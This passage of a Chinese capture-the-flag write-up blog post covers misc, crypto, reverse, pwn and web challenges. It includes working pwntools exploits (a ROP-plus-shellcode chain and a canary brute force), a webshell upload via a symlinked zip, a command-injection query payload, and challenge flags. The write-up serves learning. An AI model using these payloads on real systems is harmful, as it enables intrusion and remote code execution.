class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">18</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;rH&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image018.jpg" alt="图片"></p>
+<p>得到flag，<strong>flag{202305012359}</strong></p>
+<h3 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h3><p>这题思路比较简单，只是读取文件，但是一开始尝试的时候发现os，commands，subprocess，shlex和popen这些模块直接import的时候全部都被禁用了</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image020.gif" alt="图片"></p>
+<p>这题需要用拼接字符的方法去形成python语句来进行命令执行，而且一行有七个字符的限制</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image022.gif" alt="图片"></p>
+<p>拼接语句并执行</p>
+<p>得到flag，<strong>flag{6e363201-df3c-4957-9842-e0f79740a8df}</strong></p>
+<p>问卷</p>
+<p>填写问卷得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image024.jpg" alt="图片"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>基于国密SM2算法的密钥密文分发</p>
+<p>跟着题目给的文档进行复现</p>
+<p>首先先在线网站生成自己的private_keyA和public_keyA</p>
+<p><a target="_blank" rel="noopener" href="https://const.net.cn/tool/sm2/genkey/">https://const.net.cn/tool/sm2/genkey/</a></p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif" alt="图片"></p>
+<p>再将个人信息发送到&#x2F;api&#x2F;login获取选手id（汉字需要进行url编码）</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg" alt="图片"></p>
+<p>再用获取到的id和刚才生成的public_keyA发送到&#x2F;api&#x2F;allkey获取public_keyB和private_keyB</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg" alt="图片"></p>
+<p>在&#x2F;api&#x2F;quantum获取quantumString</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image032.jpg" alt="图片"></p>
+<p>接着以为就是要进行sm2和sm4解密了，但可以直接&#x2F;api&#x2F;search获取解密之后的quantumString</p>
+<p><img src="C:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image034.jpg" alt="图片"></p>
+<p>再用该string进行check</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image036.jpg" alt="图片"></p>
+<p>接着再次search就可以获得flag了</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image038.jpg" alt="图片"></p>
+<p><strong>flag{3e619f88-5b3c-4be2-8c9a-94067afa2a5e}</strong></p>
+<h3 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h3><p>拿到flag附件打开</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image040.jpg" alt="图片"></p>
+<p>是个替换码表的base64解密</p>
+<p>第二行urldecode得到base64码表</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image042.jpg" alt="图片"></p>
+<p>将第一行的密文进行base64换表解码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image044.gif" alt="图片"></p>
+<p>得到<strong>flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4}</strong></p>
+<h3 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h3><p>非预期出了ssh连上以后执行命令</p>
+<p>grep -ra “flag{“ &#x2F; 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image046.gif" alt="图片"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezbyte"><a href="#ezbyte" class="headerlink" title="ezbyte"></a>ezbyte</h3><p><strong>参考文章</strong><a target="_blank" rel="noopener" href="http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup%E5%92%8Chttps:/richar.top/nothingchu-ti-si-lu-ji-wp/">http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https://richar.top/nothingchu-ti-si-lu-ji-wp/</a></p>
+<p><strong>根据题目可知这道题大概是考察DWARF字节码，readelf -Wwf 可以查看DWARF字节码</strong></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif" alt="图片"></p>
+<p>字节码很长但是我们只要看其中的r12表达式</p>
+<p>先看ida</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image050.gif" alt="图片"></p>
+<p>首先要进入到yes需要r13与r12相等，而xor r13，r13把r13清零了，所以只要r12等于0就行了</p>
+<p>再根据之前的字节码分析得出</p>
+<p><code>((a3 + 1512312) ^ 0x2D393663614447B1)+ ((a1 + 1892739) ^ 0x35626665394D17E8)+ ((a2 + 8971237) ^ 0x65342D6530C04912) + ((a4 + 9123704) ^ 0x6336396431BE9AD9)=0</code>成立就行</p>
+<p>写出exp</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image052.gif" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image054.gif" alt="图片"></p>
+<p>在拼接上上面的字符</p>
+<p><strong>flag{e609efb5-e70e-4e94-ac69-ac31d96c3861}</strong></p>
+<h3 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h3><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image056.gif" alt="图片"></p>
+<p>看见这个flag，估计是假的，后面有串list，发现第一个是102就是字符“f“，可是第二个10并不是字符”l“，尝试把102^10，发现就是字符”l“，所以就是list[i]^list[i+1],解出来就是上面的假flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image058.jpg" alt="图片"></p>
+<p>第一行发现是一种Snap的语言，进入官网运行这个文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image060.gif" alt="图片"></p>
+<p>发现flag的逻辑</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image062.gif" alt="图片"></p>
+<p>根据代码分析</p>
+<p>exp</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image064.gif" alt="图片"></p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h3><p>购买啤酒功能没有对数量进行负数检查，所以可以用负数来绕过，从而进入gaming函数。gaming函数存在栈溢出，而且程序是静态链接，所以调用mprotect修改内存上的可执行权限，然后写shellcode并执行，从而getshell。</p>
+<p><strong>EXP</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;39.106.71.184&#x27;</span>,<span class="number">34447</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">200000</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">pop_rdi = <span class="number">0x40264f</span></span><br><span class="line">pop_rsi = <span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">mprotect = <span class="number">0x458B00</span></span><br><span class="line">read=<span class="number">0x457DC0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(<span class="number">0x4eA000</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x4eA000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)+p64(<span class="number">0x4eA000</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span>)</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h3><p>有fork函数和栈溢出，所以直接爆破canary，虽然给了后门，但开了PIE，所以爆破后门地址最低二字节。</p>
+<p><strong>EXP</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;39.106.48.123&#x27;</span>,<span class="number">21251</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + canary + p8(i)</span><br><span class="line">    sd(payload)</span><br><span class="line">    text = io.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;stack smashing&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        canary += p8(i)  </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">printf(uu64(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + canary + p64(<span class="number">0</span>) + p16(<span class="number">0x5228</span>)</span><br><span class="line">sda(<span class="string">b&#x27;welcome\n&#x27;</span>, payload) </span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><p>随便上传一个文件，看到返回了如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">  <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们看到这里判断了上传文件类型application&#x2F;zip为zip文件，之后执行了exec(‘cd &#x2F;tmp &amp;&amp; unzip -o ‘ . $_FILES[“file”][“tmp_name”]);到tmp但是我们无法直接访问呢，所以我们通过制作软路由来绕过&#x2F;tmp链接到&#x2F;var&#x2F;www&#x2F;html然后把shell写进去即可；</p>
+<p>上传压缩包压缩包内容如下</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image066.gif" alt="图片"></p>
+<p>在R3ape1中写入一句话之后</p>
+<p>上传蚁剑连接shell到根目录获取flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image068.gif" alt="图片"></p>
+<h3 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h3><p>搜到相关漏洞文章:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493">https://xz.aliyun.com/t/11493</a></p>
+<p>创建新用户</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image070.gif" alt="图片"></p>
+<p>在源码中找id</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image072.gif" alt="图片"></p>
+<p>新增配置</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image074.gif" alt="图片"></p>
+<p>反弹+监听+获取flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image076.gif" alt="图片"></p>
+<h3 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h3><p>&#x2F;?db&#x3D;&amp;table_2_dump&#x3D;%0a%20env</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image078.gif" alt="图片"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/misc/" rel="tag"><i class="fa fa-tag"></i> misc</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+              <a href="/tags/re/" rel="tag"><i class="fa fa-tag"></i> re</a>
+              <a href="/tags/crypto/" rel="tag"><i class="fa fa-tag"></i> crypto</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/05/03/Ubuntu%E4%B8%8Bpwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="prev" title="Ubuntu下pwn环境搭建">
+                  <i class="fa fa-chevron-left"></i> Ubuntu下pwn环境搭建
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
